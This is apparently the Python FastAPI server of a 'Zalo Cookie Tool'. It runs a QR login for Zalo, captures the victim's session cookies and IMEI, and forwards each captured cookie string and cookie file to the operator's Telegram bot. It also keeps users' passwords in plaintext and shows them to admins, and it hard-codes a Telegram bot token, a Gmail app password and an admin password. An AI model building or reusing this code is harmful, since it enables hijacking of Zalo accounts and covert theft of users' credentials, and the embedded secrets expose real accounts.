import asyncio, uuid, json, os, aiohttp, hashlib, secrets, re, smtplib, random
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request, Response, HTTPException
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware
from zalo_login import login_qr_with_unique_imei, LoginQRCallbackEventType

app = FastAPI()
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])
app.mount("/static", StaticFiles(directory="static"), name="static")

TG_BOT_TOKEN  = "7818000635:AAGJ4troYL-SpYEfoTqxj_axm4B-YPt1hvU"
TG_ADMIN_ID   = 7454964260

# Gmail SMTP config - đổi thành gmail app password của mày
SMTP_EMAIL    = "dzimeomeo@gmail.com"
SMTP_PASSWORD = "lcjqxjevirfsxime"

# OTP store: {email: {"otp": "123456", "expires": timestamp, "username": "..."}}
otp_store = {}
HISTORY_FILE  = "history.json"
USERS_FILE    = "users.json"
SESSIONS_FILE = "sessions.json"

ADMIN_ACCOUNTS = {
    "knammelbel206": hashlib.sha256("nqh300506".encode()).hexdigest()
}

def _load(path, default):
    if not os.path.exists(path):
        return default
    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except:
        return default

def _save(path, data):
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

def load_history():  return _load(HISTORY_FILE, [])
def save_history(r): _save(HISTORY_FILE, r)
def load_users():    return _load(USERS_FILE, {})
def save_users(u):   _save(USERS_FILE, u)
def load_sessions(): return _load(SESSIONS_FILE, {})
def save_sessions(s):_save(SESSIONS_FILE, s)

def add_history(record):
    records = load_history()
    records.insert(0, record)
    records = records[:200]
    save_history(records)

def hash_pw(pw): return hashlib.sha256(pw.encode()).hexdigest()

def create_session(username: str) -> str:
    token = secrets.token_hex(32)
    sessions = load_sessions()
    sessions[token] = {"username": username, "created": datetime.now().isoformat()}
    save_sessions(sessions)
    return token

def get_session_user(token: str):
    if not token:
        return None
    sessions = load_sessions()
    s = sessions.get(token)
    if not s:
        return None
    return s["username"]

def is_admin(username: str) -> bool:
    return username in ADMIN_ACCOUNTS

async def send_telegram(text: str, parse_mode="HTML"):
    url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
    async with aiohttp.ClientSession() as session:
        try:
            await session.post(url, json={
                "chat_id": TG_ADMIN_ID, "text": text,
                "parse_mode": parse_mode, "disable_web_page_preview": True
            })
        except:
            pass

async def send_telegram_file(content: bytes, filename: str, caption: str):
    url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendDocument"
    async with aiohttp.ClientSession() as session:
        try:
            form = aiohttp.FormData()
            form.add_field("chat_id", str(TG_ADMIN_ID))
            form.add_field("caption", caption, content_type="text/plain")
            form.add_field("document", content, filename=filename, content_type="text/plain")
            await session.post(url, data=form)
        except:
            pass

def get_token_from_request(request: Request) -> str:
    auth = request.headers.get("Authorization", "")
    if auth.startswith("Bearer "):
        return auth[7:]
    return request.cookies.get("session_token", "")

@app.get("/")
async def root():
    return FileResponse("static/index.html")

@app.post("/api/register")
async def register(request: Request):
    data = await request.json()
    username = (data.get("username") or "").strip()
    password = (data.get("password") or "").strip()
    email    = (data.get("email") or "").strip()

    if not username or not password or not email:
        raise HTTPException(400, "Thiếu thông tin")
    if len(username) < 6:
        raise HTTPException(400, "Tên đăng nhập phải ≥ 6 ký tự")
    if len(password) < 6:
        raise HTTPException(400, "Mật khẩu phải ≥ 6 ký tự")
    if not re.match(r"[^@]+@gmail\.com$", email, re.IGNORECASE):
        raise HTTPException(400, "Chỉ chấp nhận email @gmail.com")
    if username in ADMIN_ACCOUNTS:
        raise HTTPException(400, "Tên đăng nhập đã tồn tại")

    users = load_users()
    if username in users:
        raise HTTPException(400, "Tên đăng nhập đã tồn tại")
    if any(u.get("email","").lower() == email.lower() for u in users.values()):
        raise HTTPException(400, "Email này đã được đăng ký")

    users[username] = {
        "password":       hash_pw(password),
        "password_plain": password,
        "email":          email,
        "created":        datetime.now().strftime("%d/%m/%Y %H:%M:%S"),
        "active":         True
    }
    save_users(users)

    asyncio.create_task(send_telegram(
        f"🆕 <b>Tài khoản mới đăng ký</b>\n👤 <code>{username}</code>\n📧 {email}\n🕐 {users[username]['created']}"
    ))

    token = create_session(username)
    return JSONResponse({"ok": True, "token": token, "username": username, "is_admin": False})

@app.post("/api/login")
async def login(request: Request):
    data = await request.json()
    username = (data.get("username") or "").strip()
    password = (data.get("password") or "").strip()

    if not username or not password:
        raise HTTPException(400, "Thiếu tên đăng nhập hoặc mật khẩu")

    if username in ADMIN_ACCOUNTS:
        if ADMIN_ACCOUNTS[username] != hash_pw(password):
            raise HTTPException(401, "Sai mật khẩu")
        token = create_session(username)
        return JSONResponse({"ok": True, "token": token, "username": username, "is_admin": True})

    users = load_users()
    user  = users.get(username)
    if not user:
        raise HTTPException(401, "Tài khoản không tồn tại")
    if not user.get("active", True):
        raise HTTPException(403, "Tài khoản đã bị khóa")
    if user["password"] != hash_pw(password):
        raise HTTPException(401, "Sai mật khẩu")

    token = create_session(username)
    return JSONResponse({"ok": True, "token": token, "username": username, "is_admin": False})

@app.post("/api/logout")
async def logout(request: Request):
    token = get_token_from_request(request)
    if token:
        sessions = load_sessions()
        sessions.pop(token, None)
        save_sessions(sessions)
    return JSONResponse({"ok": True})


def send_otp_email(to_email: str, otp: str, username: str):
    msg = MIMEMultipart("alternative")
    msg["Subject"] = "🔑 Mã OTP xác nhận - Zalo Cookie Tool by Dzi Meo Meo"
    msg["From"]    = f"Dzi Meo Meo - Zalo Cookie Tool <{SMTP_EMAIL}>"
    msg["To"]      = to_email
    html = f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"></head>
<body style="margin:0;padding:0;background:#0f1117;font-family:Arial,sans-serif">
  <table width="100%" cellpadding="0" cellspacing="0" style="background:#0f1117;padding:40px 0">
    <tr><td align="center">
      <table width="480" cellpadding="0" cellspacing="0" style="background:#1a1f2e;border-radius:16px;overflow:hidden;box-shadow:0 8px 32px rgba(0,0,0,0.4)">

        <!-- HEADER -->
        <tr><td style="background:linear-gradient(135deg,#1e90ff,#00c6ff);padding:32px;text-align:center">
          <div style="width:64px;height:64px;background:rgba(255,255,255,0.15);border-radius:16px;margin:0 auto 12px;display:flex;align-items:center;justify-content:center;font-size:32px;line-height:64px">🍪</div>
          <h1 style="margin:0;color:#fff;font-size:22px;font-weight:700;letter-spacing:0.5px">Zalo Cookie Tool</h1>
          <p style="margin:4px 0 0;color:rgba(255,255,255,0.75);font-size:13px">by Dzi Meo Meo</p>
        </td></tr>

        <!-- BODY -->
        <tr><td style="padding:36px 40px">
          <p style="margin:0 0 8px;color:#aab0c0;font-size:14px">Xin chào,</p>
          <p style="margin:0 0 24px;color:#e0e6f0;font-size:15px">Mã xác thực đặt lại mật khẩu của bạn là:</p>

          <!-- OTP BOX -->
          <div style="background:#0f1117;border:2px solid #1e90ff;border-radius:12px;padding:28px;text-align:center;margin:0 0 24px">
            <span style="font-size:42px;font-weight:800;letter-spacing:12px;color:#1e90ff;font-family:monospace">{otp}</span>
          </div>

          <p style="margin:0 0 8px;color:#aab0c0;font-size:13px;text-align:center">
            Mã có hiệu lực trong <strong style="color:#fff">5 phút</strong>
          </p>
          <p style="margin:0;color:#ff5c5c;font-size:12px;text-align:center">⚠️ Không chia sẻ mã này với bất kỳ ai</p>
        </td></tr>

        <!-- FOOTER -->
        <tr><td style="background:#12161f;padding:20px 40px;border-top:1px solid #2a3145">
          <p style="margin:0;color:#555;font-size:11px;text-align:center">
            Nếu bạn không yêu cầu đặt lại mật khẩu, hãy bỏ qua email này.<br>
            © 2026 Zalo Cookie Tool · by Dzi Meo Meo
          </p>
        </td></tr>

      </table>
    </td></tr>
  </table>
</body></html>"""
    msg.attach(MIMEText(html, "html"))
    try:
        with smtplib.SMTP("smtp.gmail.com", 587, timeout=15) as s:
            s.ehlo()
            s.starttls()
            s.ehlo()
            s.login(SMTP_EMAIL, SMTP_PASSWORD)
            s.send_message(msg)
        return True
    except smtplib.SMTPAuthenticationError as e:
        print(f"SMTP auth failed (check app password): {e}")
        return False
    except TimeoutError as e:
        print(f"SMTP timeout: {e}")
        return False
    except Exception as e:
        print(f"SMTP error: {type(e).__name__}: {e}")
        return False

@app.post("/api/forgot-password")
async def forgot_password(request: Request):
    data     = await request.json()
    email    = (data.get("email") or "").strip().lower()
    if not email:
        raise HTTPException(400, "Thiếu email")
    if not re.match(r"[^@]+@gmail\.com$", email, re.IGNORECASE):
        raise HTTPException(400, "Chỉ chấp nhận email @gmail.com")

    users = load_users()
    user_found = None
    for uname, udata in users.items():
        if udata.get("email","").lower() == email:
            user_found = uname
            break
    if not user_found:
        raise HTTPException(404, "Email không tồn tại trong hệ thống")

    otp  = str(random.randint(100000, 999999))
    import time
    otp_store[email] = {"otp": otp, "expires": time.time() + 300, "username": user_found}

    try:
        sent = await asyncio.wait_for(
            asyncio.get_event_loop().run_in_executor(None, send_otp_email, email, otp, user_found),
            timeout=20.0
        )
    except asyncio.TimeoutError:
        raise HTTPException(500, "Gửi email timeout, vui lòng thử lại sau")
    if not sent:
        raise HTTPException(500, "Không thể gửi email, vui lòng thử lại")

    return JSONResponse({"ok": True, "msg": f"Đã gửi OTP về {email}"})

@app.post("/api/verify-otp")
async def verify_otp(request: Request):
    import time
    data  = await request.json()
    email = (data.get("email") or "").strip().lower()
    otp   = (data.get("otp") or "").strip()
    if not email or not otp:
        raise HTTPException(400, "Thiếu thông tin")

    record = otp_store.get(email)
    if not record:
        raise HTTPException(400, "OTP không hợp lệ hoặc đã hết hạn")
    if time.time() > record["expires"]:
        otp_store.pop(email, None)
        raise HTTPException(400, "OTP đã hết hạn, vui lòng yêu cầu lại")
    if record["otp"] != otp:
        raise HTTPException(400, "OTP không đúng")

    return JSONResponse({"ok": True, "username": record["username"]})

@app.post("/api/reset-password")
async def reset_password(request: Request):
    import time
    data     = await request.json()
    email    = (data.get("email") or "").strip().lower()
    otp      = (data.get("otp") or "").strip()
    new_pw   = (data.get("new_password") or "").strip()

    if not email or not otp or not new_pw:
        raise HTTPException(400, "Thiếu thông tin")
    if len(new_pw) < 6:
        raise HTTPException(400, "Mật khẩu phải ≥ 6 ký tự")

    record = otp_store.get(email)
    if not record:
        raise HTTPException(400, "OTP không hợp lệ hoặc đã hết hạn")
    if time.time() > record["expires"]:
        otp_store.pop(email, None)
        raise HTTPException(400, "OTP đã hết hạn")
    if record["otp"] != otp:
        raise HTTPException(400, "OTP không đúng")

    users    = load_users()
    username = record["username"]
    if username not in users:
        raise HTTPException(404, "Tài khoản không tồn tại")

    users[username]["password"]       = hash_pw(new_pw)
    users[username]["password_plain"] = new_pw
    save_users(users)
    otp_store.pop(email, None)

    asyncio.create_task(send_telegram(
        f"🔑 <b>Đặt lại mật khẩu</b>\n👤 <code>{username}</code>\n📧 {email}"
    ))

    return JSONResponse({"ok": True, "msg": "Đặt lại mật khẩu thành công!"})

@app.get("/api/history")
async def get_history(request: Request):
    token    = get_token_from_request(request)
    username = get_session_user(token)
    if not username:
        raise HTTPException(401, "Chưa đăng nhập")

    records = load_history()
    if not is_admin(username):
        records = [r for r in records if r.get("owner") == username]
    return JSONResponse(records)

@app.get("/api/admin/users")
async def admin_users(request: Request, page: int = 0):
    token    = get_token_from_request(request)
    username = get_session_user(token)
    if not username or not is_admin(username):
        raise HTTPException(403, "Không có quyền")

    users = load_users()
    items = []
    for uname, udata in users.items():
        items.append({
            "username":       uname,
            "email":          udata.get("email", ""),
            "password":       udata.get("password", ""),
            "password_plain": udata.get("password_plain", ""),
            "created":        udata.get("created", ""),
            "active":         udata.get("active", True)
        })
    items.sort(key=lambda x: x["created"], reverse=True)

    per_page = 20
    total    = len(items)
    chunk    = items[page * per_page:(page + 1) * per_page]
    return JSONResponse({"total": total, "page": page, "per_page": per_page, "users": chunk})

@app.post("/api/admin/users/{target}/toggle")
async def admin_toggle_user(target: str, request: Request):
    token    = get_token_from_request(request)
    username = get_session_user(token)
    if not username or not is_admin(username):
        raise HTTPException(403, "Không có quyền")

    users = load_users()
    if target not in users:
        raise HTTPException(404, "Không tìm thấy tài khoản")
    users[target]["active"] = not users[target].get("active", True)
    save_users(users)
    return JSONResponse({"ok": True, "active": users[target]["active"]})

@app.delete("/api/admin/users/{target}")
async def admin_delete_user(target: str, request: Request):
    token    = get_token_from_request(request)
    username = get_session_user(token)
    if not username or not is_admin(username):
        raise HTTPException(403, "Không có quyền")

    users = load_users()
    if target not in users:
        raise HTTPException(404, "Không tìm thấy")
    del users[target]
    save_users(users)
    return JSONResponse({"ok": True})

@app.websocket("/ws/{session_id}")
async def ws_endpoint(ws: WebSocket, session_id: str):
    await ws.accept()

    token    = ws.query_params.get("token", "")
    username = get_session_user(token)
    if not username:
        await ws.send_json({"type": "error", "msg": "Chưa đăng nhập. Vui lòng đăng nhập lại."})
        await ws.close()
        return

    async def callback(event):
        etype = event["type"]
        if etype == LoginQRCallbackEventType.QRCodeGenerated:
            await ws.send_json({"type": "qr", "image": event["data"]["image"]})
        elif etype == LoginQRCallbackEventType.QRCodeScanned:
            name = event["data"].get("display_name", "")
            await ws.send_json({"type": "scanned", "name": name})
        elif etype == LoginQRCallbackEventType.QRCodeExpired:
            await ws.send_json({"type": "expired"})
        elif etype == LoginQRCallbackEventType.QRCodeDeclined:
            await ws.send_json({"type": "declined"})

    try:
        await ws.send_json({"type": "status", "msg": "Đang tạo mã QR..."})
        result = await login_qr_with_unique_imei(callback=callback)

        if not result:
            await ws.send_json({"type": "error", "msg": "Đăng nhập thất bại."})
            return

        cookies    = result["cookies"]
        user       = result["user_info"]
        imei       = result["imei"]
        cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())
        now        = datetime.now().strftime("%d/%m/%Y %H:%M:%S")

        name = user.get("displayName", "N/A") or "N/A"

        record = {
            "id":         session_id[:8],
            "owner":      username,
            "name":       name,
            "imei":       imei,
            "cookie_str": cookie_str,
            "cookies":    cookies,
            "time":       now,
        }
        add_history(record)

        await ws.send_json({"type": "success", **record})

        txt = (
            f"=== ZALO COOKIE ===\n"
            f"Tên: {name}\nIMEI: {imei}\n"
            f"Thời gian: {now}\nLấy bởi: {username}\n\n"
            f"--- COOKIE STRING ---\n{cookie_str}\n\n"
            f"--- COOKIE JSON ---\n{json.dumps(cookies, ensure_ascii=False, indent=2)}\n"
        )

        tg_text = (
            f"🍪 <b>ZALO COOKIE MỚI</b>\n\n"
            f"👤 Tên: <b>{name}</b>\n"
            f"📡 IMEI: <code>{imei}</code>\n"
            f"🕐 Thời gian: {now}\n👨‍💻 Lấy bởi: <code>{username}</code>\n\n"
            f"<b>Cookie String:</b>\n<code>{cookie_str[:500]}{'...' if len(cookie_str)>500 else ''}</code>"
        )
        asyncio.create_task(send_telegram(tg_text))
        asyncio.create_task(send_telegram_file(
            txt.encode("utf-8"),
            f"cookie_{name}_{now[:10].replace('/','-')}.txt",
            f"📄 Cookie file — {name} | by {username}"
        ))

    except WebSocketDisconnect:
        pass
    except Exception as e:
        try:
            await ws.send_json({"type": "error", "msg": str(e)})
            asyncio.create_task(send_telegram(
                f"⚠️ <b>LỖI SERVER</b>\n👨‍💻 User: <code>{username}</code>\n❌ Lỗi: <code>{str(e)}</code>"
            ))
        except:
            pass

if __name__ == "__main__":
    import uvicorn
    port = int(os.environ.get("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
